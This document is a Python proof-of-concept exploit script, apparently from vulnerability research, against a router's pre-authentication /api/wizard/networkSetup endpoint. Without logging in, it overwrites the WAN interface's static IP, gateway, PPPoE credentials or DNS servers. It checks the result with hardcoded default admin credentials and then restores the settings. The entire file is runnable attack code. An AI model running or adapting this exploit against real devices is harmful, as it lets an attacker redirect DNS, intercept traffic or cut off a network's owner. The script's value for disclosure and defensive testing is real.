#!/usr/bin/env python3
import argparse
import json
import time
import requests


def post(base: str, path: str, body: dict):
    r = requests.post(base.rstrip('/') + path, json=body, timeout=20)
    r.raise_for_status()
    return r.json()


def auth_call(base: str, payload):
    login = requests.post(base.rstrip('/') + '/api/login/auth', json={'username': 'admin', 'password': 'admin123'}, timeout=10).json()
    sess = login['data']['session']
    headers = {'AUTHENTICATION': sess, 'Content-Type': 'application/json'}
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=20)
    r.raise_for_status()
    return r.json()


def show_state(base: str, title: str):
    print(f'## {title}')
    print('wizard/getNetworkConf')
    print(json.dumps(post(base, '/api/wizard/getNetworkConf', {}), ensure_ascii=False, indent=2))
    print('wizard/getNetworkStatus')
    print(json.dumps(post(base, '/api/wizard/getNetworkStatus', {}), ensure_ascii=False, indent=2))
    print('esps.wan get')
    print(json.dumps(auth_call(base, [{'object':'esps.wan','method':'get','id':1,'param':{'list':['WAN1']}}]), ensure_ascii=False, indent=2))
    print('esps.wan status')
    print(json.dumps(auth_call(base, [{'object':'esps.wan','method':'status','id':1,'param':{'list':['WAN1']}}]), ensure_ascii=False, indent=2))
    print()


def main():
    ap = argparse.ArgumentParser(description='Pre-auth wizard/networkSetup hijack PoC')
    ap.add_argument('--base', default='http://192.168.8.1')
    ap.add_argument('--mode', choices=['static', 'pppoe', 'dhcp-dns'], default='static')
    args = ap.parse_args()

    base = args.base.rstrip('/')
    show_state(base, 'baseline')

    if args.mode == 'static':
        payload = {
            'intf':'WAN1', 'workMode':'static', 'ip':'1.2.3.4', 'submask':'255.255.255.0',
            'gwIp':'1.2.3.1', 'dnsMaster':'8.8.8.8', 'dnsSlave':'1.1.1.1', 'mtu':1500
        }
    elif args.mode == 'pppoe':
        payload = {
            'intf':'WAN1', 'workMode':'pppoe', 'user':'eviluser', 'pwd':'evilpass',
            'dnsMaster':'9.9.9.9', 'dnsSlave':'4.4.4.4', 'mtu':1492
        }
    else:
        payload = {
            'intf':'WAN1', 'workMode':'dhcp', 'dnsMaster':'8.8.4.4', 'dnsSlave':'1.0.0.1', 'mtu':1500
        }

    print('## pre-auth write payload')
    print(json.dumps(payload, ensure_ascii=False, indent=2))
    print(json.dumps(post(base, '/api/wizard/networkSetup', payload), ensure_ascii=False, indent=2))
    time.sleep(2)
    show_state(base, f'after {args.mode}')

    restore = {'intf':'WAN1', 'workMode':'dhcp', 'dnsMaster':'0.0.0.0', 'dnsSlave':'0.0.0.0', 'mtu':1500}
    print('## restore payload')
    print(json.dumps(restore, ensure_ascii=False, indent=2))
    print(json.dumps(post(base, '/api/wizard/networkSetup', restore), ensure_ascii=False, indent=2))
    time.sleep(2)
    show_state(base, 'after restore')


if __name__ == '__main__':
    main()
